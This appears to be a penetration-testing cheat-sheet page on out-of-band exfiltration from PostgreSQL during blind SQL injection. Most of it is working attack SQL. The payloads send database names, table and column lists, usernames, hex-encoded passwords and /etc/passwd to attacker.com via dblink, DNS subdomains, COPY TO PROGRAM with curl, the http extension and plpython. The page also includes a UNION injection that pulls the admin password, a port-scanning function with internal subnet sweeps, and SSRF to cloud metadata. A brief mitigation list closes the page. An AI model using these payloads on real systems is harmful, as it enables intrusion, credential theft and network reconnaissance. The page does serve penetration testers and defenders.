---
title: Out of Band Channeling
description: Techniques for exfiltrating data through out-of-band channels in PostgreSQL
category: Advanced Techniques
order: 17
tags: ["OOB", "exfiltration", "DNS", "dblink"]
lastUpdated: 2025-12-14
---

## Out of Band Channeling

Out-of-band (OOB) channeling refers to techniques that exfiltrate data through channels other than the application's normal response. This approach is valuable in blind SQL injection scenarios where no data is returned in the application's response.

### When to Use OOB Techniques

- Blind SQL injection scenarios where no output is visible
- Asynchronous query execution prevents time-based attacks
- Application responses are filtered or truncated
- Firewall rules block traditional SQL injection but allow outbound connections

### PostgreSQL OOB Methods

PostgreSQL offers several mechanisms for out-of-band data exfiltration:

#### 1. dblink Data Exfiltration

The `dblink` extension allows PostgreSQL to connect to remote PostgreSQL servers. Data can be exfiltrated by embedding query results in connection parameters:

```sql
-- Basic dblink connection (requires dblink extension)
SELECT dblink_connect('host=attacker.com user=data password=secret dbname=exfil');

-- Exfiltrate data via username field
SELECT dblink_connect('host=attacker.com user=' || (SELECT version()) || ' password=x dbname=x');
```

The attacker monitors network traffic to capture the plaintext PostgreSQL protocol packets containing the exfiltrated data.

#### 2. DNS Exfiltration via dblink

```sql
-- Exfiltrate data via DNS lookup
SELECT dblink_connect('host=' || (SELECT version()) || '.attacker.com user=x password=x dbname=x');
```

This causes PostgreSQL to perform a DNS lookup for a subdomain containing the extracted data.

#### 3. COPY TO PROGRAM

If you have superuser privileges, `COPY TO PROGRAM` executes shell commands:

```sql
-- Execute command and exfiltrate via DNS
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com';

-- HTTP-based exfiltration
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(base64 /etc/passwd)';

-- Exfiltrate query results
COPY (SELECT version()) TO PROGRAM 'curl -d @- http://attacker.com/collect';
```

#### 4. Large Object Exfiltration

Large Objects can load files that are then exfiltrated via dblink:

```sql
-- Load file into large object
SELECT lo_import('/etc/passwd');  -- Returns OID, e.g., 16444

-- Read the large object content
SELECT convert_from(lo_get(16444), 'UTF8');

-- Exfiltrate via dblink
SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT convert_from(lo_get(16444), 'UTF8')) ||
    ' password=x dbname=x');

-- Clean up
SELECT lo_unlink(16444);
```

### Practical Examples

#### Metadata Extraction via dblink

```sql
-- Extract database list
SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT string_agg(datname, ':') FROM pg_database) ||
    ' password=x dbname=x');

-- Extract table names
SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT string_agg(tablename, ':') FROM pg_tables WHERE schemaname='public') ||
    ' password=x dbname=x');

-- Extract column names
SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT string_agg(column_name, ':') FROM information_schema.columns WHERE table_name='users') ||
    ' password=x dbname=x');
```

#### Data Extraction via dblink

```sql
-- Extract usernames
SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT string_agg(username, ':') FROM users) ||
    ' password=x dbname=x');

-- Extract passwords (hex encoded to avoid special chars)
SELECT dblink_connect('host=attacker.com user=' ||
    encode((SELECT string_agg(password, ':') FROM users)::bytea, 'hex') ||
    ' password=x dbname=x');
```

#### UNION-Based dblink Injection

```sql
-- In a UNION injection context
' UNION SELECT 1,(SELECT dblink_connect('host=attacker.com user=' ||
    (SELECT password FROM users WHERE username='admin') ||
    ' password=x dbname=x')) --
```

### Encoding for Transport

#### Handling Whitespace and Special Characters

PostgreSQL connection strings cannot contain whitespace. Encode or replace special characters:

```sql
-- Replace spaces with underscores
SELECT dblink_connect('host=attacker.com user=' ||
    replace((SELECT version()), ' ', '_') ||
    ' password=x dbname=x');

-- Hex encode the data
SELECT dblink_connect('host=attacker.com user=' ||
    encode((SELECT version())::bytea, 'hex') ||
    ' password=x dbname=x');

-- Base64 encode (remove padding and newlines)
SELECT dblink_connect('host=attacker.com user=' ||
    replace(replace(encode((SELECT version())::bytea, 'base64'), '=', ''), E'\n', '') ||
    ' password=x dbname=x');
```

#### Chunking Large Data

DNS labels have a maximum length of 63 characters, domains 253 total:

```sql
-- Extract in chunks
SELECT dblink_connect('host=' ||
    substring((SELECT string_agg(username,':') FROM users), 1, 60) ||
    '.chunk1.attacker.com user=x password=x dbname=x');

SELECT dblink_connect('host=' ||
    substring((SELECT string_agg(username,':') FROM users), 61, 60) ||
    '.chunk2.attacker.com user=x password=x dbname=x');
```

### Port Scanning via dblink

The `dblink_connect` function can be used to perform port scanning by analyzing error messages or connection behavior.

**Basic Port Scan:**

```sql
-- Attempt connection to target host:port
SELECT dblink_connect('host=192.168.1.1 port=22 user=test password=test dbname=test connect_timeout=1');
```

**Error Message Analysis:**

| Error Message                                                             | Meaning                            |
| ------------------------------------------------------------------------- | ---------------------------------- |
| `could not establish connection` / `Connection refused`                   | Port closed                        |
| `timeout expired` / `Connection timed out`                                | Port filtered or host down         |
| `received invalid response` / `server closed the connection unexpectedly` | Port open (non-PostgreSQL service) |
| `password authentication failed`                                          | Port open (PostgreSQL service)     |
| `FATAL: database "test" does not exist`                                   | Port open (PostgreSQL service)     |

**Scanning Function:**

```sql
-- Create a port scanning function
CREATE OR REPLACE FUNCTION port_scan(target TEXT, port INT)
RETURNS TEXT
LANGUAGE plpgsql AS $$
DECLARE
    result TEXT;
BEGIN
    BEGIN
        PERFORM dblink_connect('portscan',
            'host=' || target ||
            ' port=' || port ||
            ' user=scanner password=x dbname=x connect_timeout=2');
        PERFORM dblink_disconnect('portscan');
        RETURN 'open (postgresql)';
    EXCEPTION
        WHEN sqlclient_unable_to_establish_sqlconnection THEN
            -- Check error message for port status
            GET STACKED DIAGNOSTICS result = MESSAGE_TEXT;
            IF result LIKE '%refused%' THEN
                RETURN 'closed';
            ELSIF result LIKE '%timeout%' THEN
                RETURN 'filtered';
            ELSE
                RETURN 'open (other): ' || result;
            END IF;
        WHEN OTHERS THEN
            GET STACKED DIAGNOSTICS result = MESSAGE_TEXT;
            RETURN 'error: ' || result;
    END;
END;
$$;

-- Scan common ports
SELECT port_scan('192.168.1.1', 22);   -- SSH
SELECT port_scan('192.168.1.1', 80);   -- HTTP
SELECT port_scan('192.168.1.1', 443);  -- HTTPS
SELECT port_scan('192.168.1.1', 3306); -- MySQL
SELECT port_scan('192.168.1.1', 5432); -- PostgreSQL
```

**Scanning Multiple Ports:**

```sql
-- Scan port range
SELECT port, port_scan('192.168.1.1', port)
FROM generate_series(1, 1024) AS port;

-- Scan common ports only
SELECT port, port_scan('192.168.1.1', port)
FROM unnest(ARRAY[21,22,23,25,80,443,3306,3389,5432,8080]) AS port;
```

**Internal Network Discovery:**

```sql
-- Scan internal IP range for PostgreSQL instances
SELECT ip, port_scan(ip, 5432) AS pg_status
FROM (
    SELECT '192.168.1.' || n AS ip
    FROM generate_series(1, 254) AS n
) AS hosts
WHERE port_scan(ip, 5432) NOT LIKE 'closed%';
```

**SSRF via dblink (Server-Side Request Forgery):**

```sql
-- Access internal services
SELECT dblink_connect('host=internal-service.local port=6379 user=x password=x dbname=x');

-- Access cloud metadata (AWS)
SELECT dblink_connect('host=169.254.169.254 port=80 user=x password=x dbname=x');
```

### Using pg_notify for Exfiltration

The `NOTIFY` command can be captured if you have a listening connection:

```sql
-- Send notification with data
SELECT pg_notify('channel', (SELECT version()));

-- Listen from another session
LISTEN channel;
```

### HTTP Extensions

Some PostgreSQL installations have HTTP extensions:

```sql
-- If http extension is installed
SELECT http_get('http://attacker.com/?data=' || (SELECT version()));

-- Using plpython if available
CREATE FUNCTION http_exfil(data text) RETURNS void AS $$
import urllib.request
urllib.request.urlopen('http://attacker.com/?d=' + data)
$$ LANGUAGE plpythonu;
```

### Required Setup

To capture exfiltrated data, you need:

1. **For dblink**: A server with PostgreSQL running and network monitoring (tcpdump)
2. **For DNS**: A domain you control with DNS logging (or Burp Collaborator)
3. **For HTTP**: A web server to receive requests

### Checking for dblink Availability

```sql
-- Check if dblink extension exists
SELECT * FROM pg_extension WHERE extname = 'dblink';

-- Check if dblink functions are available
SELECT proname FROM pg_proc WHERE proname LIKE 'dblink%';

-- Try to create the extension (requires privileges)
CREATE EXTENSION IF NOT EXISTS dblink;
```

### Limitations

1. `dblink` extension must be installed and accessible
2. Outbound network connections must be allowed
3. `COPY TO PROGRAM` requires superuser or `pg_execute_server_program` role
4. DNS queries are limited to 253 characters total
5. PostgreSQL protocol packets are plaintext by default
6. Some cloud PostgreSQL instances restrict outbound connections

### Privilege Requirements

| Method          | Minimum Privilege Required             |
| --------------- | -------------------------------------- |
| dblink_connect  | USAGE on dblink extension              |
| COPY TO PROGRAM | Superuser or pg_execute_server_program |
| lo_import       | Create large objects privilege         |
| pg_notify       | No special privileges                  |

### Detection and Mitigation

To prevent OOB attacks:

1. Restrict outbound connections from the database server
2. Don't install unnecessary extensions like dblink
3. Use parameterized queries to prevent SQL injection
4. Configure firewalls to block unexpected outbound connections
5. Monitor unusual DNS or network activity from database servers
6. Revoke unnecessary privileges from database users
